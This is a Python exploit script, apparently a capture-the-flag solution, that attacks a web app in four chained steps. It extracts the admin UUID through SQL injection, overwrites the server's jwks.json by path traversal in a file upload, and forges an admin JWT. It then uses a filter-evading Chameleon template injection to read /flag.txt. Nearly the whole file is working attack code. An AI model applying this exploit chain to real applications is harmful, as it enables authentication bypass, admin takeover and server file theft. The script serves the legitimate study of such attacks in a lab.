#!/usr/bin/env python3

import json
import re
import sys
import jwt
import requests

from jwcrypto import jwk
from bs4 import BeautifulSoup


# BASE_URL = "http://154.57.164.76:30292"
BASE_URL = "http://localhost:3000"
UUID_RE = re.compile(rb"[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}")


def main():
    session = requests.Session()
    username = password = "vego123"

    # Register the user and log in
    response = session.post(f"{BASE_URL}/register",
        data = {
            "username": username,
            "password": password,
        },
    )
    response.raise_for_status()

    response = session.post(
        f"{BASE_URL}/login",
        data={
            "username": username,
            "password": password,
        },
    )
    response.raise_for_status()

    print(f"[*] Logged in as {username}")

    # Perform a SQL injection in the hidden token field (located inside the hidden form)
    # We'll map the admin UUID into all returned string fields.
    sqli = "x' UNION SELECT id,id,id,id,role FROM users WHERE role='admin' -- "

    response = session.post(f"{BASE_URL}/profile",
        data = {
            "token": sqli
        },
    )
    response.raise_for_status()

    matches = UUID_RE.findall(response.content)
    if not matches:
        # print(response.text)
        print("[!] No admin UUID extracted!")
        exit(-1)

    admin_uuid = matches[0].decode()
    print(f"[+] Admin UUID: {admin_uuid}")

    # Now we have to generate a valid signing key.
    private_jwk = jwk.JWK.generate(kty="RSA", size=2048, alg="RS256", use="sig")
    private_jwk.kid = "SuP3rS3cR3tK3y"

    public_jwk = json.loads(private_jwk.export_public())
    public_jwk["kid"] = private_jwk.kid
    public_jwk["alg"] = "RS256"
    public_jwk["use"] = "sig"

    jwks = json.dumps({"keys": [public_jwk]}).encode()

    # Next we have to overwrite "static/.well-known/jwks.json"
    response = session.post(f"{BASE_URL}/api/chat-messages",
        data = {
            "message": "asdasdasd"
        },

        files = {
            "attachment": (
                "../static/.well-known/jwks.json",
                jwks,
                "application/json",
            )
        },
        
        allow_redirects = False,
    )

    if response.status_code != 302:
        print(f"JWKS upload failed: {response.status_code} {response.text}")
        exit(-2)

    print("[+] Replaced the server JWKS")

    # Since we now know the server's JWKs (well, they're ours),
    # we can forge a valid admin JWT to impersonate him/her
    private_pem = private_jwk.export_to_pem(private_key = True, password = None)

    forged_token = jwt.encode(
        {"user_id": admin_uuid},
        private_pem,
        algorithm = "RS256",
        headers = {
            "kid": private_jwk.kid,
            "alg": "RS256",
            "typ": "JWT",
        }
    )

    session.cookies.clear()
    session.cookies.set("auth_token", forged_token)

    # Just to be sure, we can confirm we are admin by accessing an admin page
    response = session.get(f"{BASE_URL}/admin/announcements",
        allow_redirects = False
    )

    if response.status_code != 200:
        print(f"[!] Admin access failed: {response.status_code} -> {response.headers.get('Location')}")
        exit(-3)

    print("[+] Admin access obtained!")

    # Lastly, we'll leverage a SSTI inside Chameleon's template engine to get the flag.
    # We must avoid the following characters: $#{}"_. (dollar, hash, curly braces, double quote, underscore, dot).
    # We can use the corresponding HTML entity for double quotes and `chr(46)` for the dot character
    payload = "<div tal:content='python:getattr(open(&quot;/flag&quot;+chr(46)+&quot;txt&quot;),&quot;read&quot;)()'>x</div>"
    
    response = session.post(f"{BASE_URL}/api/announcements",
        data = {
            "title": "FLAG",
            "announcement": payload
        }
    )

    # Now we can retrieve the flag from the announcements page by looking for our "FLAG" announcement
    # and extracting the content of the link's data-announcement attribute
    announcements = session.get(f"{BASE_URL}/announcements")
    soup = BeautifulSoup(announcements.text, "html.parser")
    
    flag = None
    for link in soup.select("a[data-announcement]"):
        if link.get_text(strip=True) == "FLAG":
            flag = link.get("data-announcement")
            break

    if flag is None:
        print("[!] FLAG not found")
        # print(announcements.text)
        exit(-1)

    flag = flag.strip()[5:-6]   # Remove the <div></div> tags
    print(f"[!] Flag: {flag}")
    exit(0)


if __name__ == "__main__":
    main()
